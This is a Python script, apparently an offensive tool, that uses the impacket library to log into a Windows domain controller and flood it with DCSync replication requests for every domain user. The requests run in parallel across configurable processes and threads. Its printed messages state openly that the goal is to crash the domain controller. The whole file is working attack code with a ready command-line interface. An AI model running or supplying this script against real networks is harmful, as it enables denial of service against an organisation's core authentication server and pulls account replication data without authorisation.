import threading
import multiprocessing
import traceback
import time
import random


from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.dcerpc.v5 import drsuapi



class DRSUAPIOps:
	def __init__(self, target, username, password):
		self.target = target
		self.username = username
		self.password = password


	def run(self):
		while True:
			try:
				self.__smbConnection = SMBConnection(remoteName = self.target, remoteHost = self.target)
				self.__smbConnection.login(self.username, self.password)

				self.__remoteOps  = RemoteOperations(self.__smbConnection, False, None)
				enumerationContext = 0
				status = STATUS_MORE_ENTRIES
				while status == STATUS_MORE_ENTRIES:
					resp = self.__remoteOps.getDomainUsers(enumerationContext)

					for user in resp['Buffer']['Buffer']:
						userName = user['Name']
						#print('userName : %s' % userName)

						userSid = self.__remoteOps.ridToSid(user['RelativeId'])
						crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME,
																				 drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
																				 name=userSid.formatCanonical())

						if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
							if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
								break
							userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
							# userRecord.dump()
							replyVersion = 'V%d' % userRecord['pdwOutVersion']

					enumerationContext = resp['EnumerationContext']
					status = resp['ErrorCode']
			except Exception as e:
				if str(e).find('STATUS_PIPE_NOT_AVAILABLE') != -1:
					continue
				elif str(e).find('STATUS_PIPE_CLOSING') != -1:
					print('Server is restarting prolly now...')
					return
				raise e

class ThreadedOps(threading.Thread):
	def __init__(self, target, username, password):
		threading.Thread.__init__(self)
		self.target = target
		self.username = username
		self.password = password


	def run(self):
		try:
			ops = DRSUAPIOps(self.target, self.username, self.password)
			ops.run()
		except Exception as e:
			traceback.print_exc()
		return

class MPOps(multiprocessing.Process):
	def __init__(self, target, username, password, threadcount = 5):
		multiprocessing.Process.__init__(self)
		self.thread_count = threadcount
		self.threads = []
		self.target = target
		self.username = username
		self.password = password

	def run(self):
		for i in range(self.thread_count):
			ops = ThreadedOps(self.target, self.username, self.password)
			ops.daemon = True
			ops.start()
			self.threads.append(ops)

		for ops in self.threads:
			ops.join()
		return


def run():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('target', help='Target IP address')
	parser.add_argument('username', help='Username')
	parser.add_argument('password', help='Password')
	parser.add_argument('-t','--threadcount', type=int, default = 5, help='Thread count')
	parser.add_argument('-p','--processcount', type=int, default = 5, help='Process count')

	args = parser.parse_args()

	print('Starting DCSync on multiple thread/processes, this might take a while...')
	processes = []
	for i in range(args.processcount):
		#mp = MPOps(args.target, args.username, args.password)
		mp = MPOps(args.target, args.username, args.password, threadcount = args.threadcount)
		mp.deamon = True
		mp.start()
		processes.append(mp)

	print('Sorry, no fancy memory adresses. Just crashing the DC.')

	for mp in processes:
		mp.join()

	print('Should have crashed by now')


if __name__ == '__main__':
	run()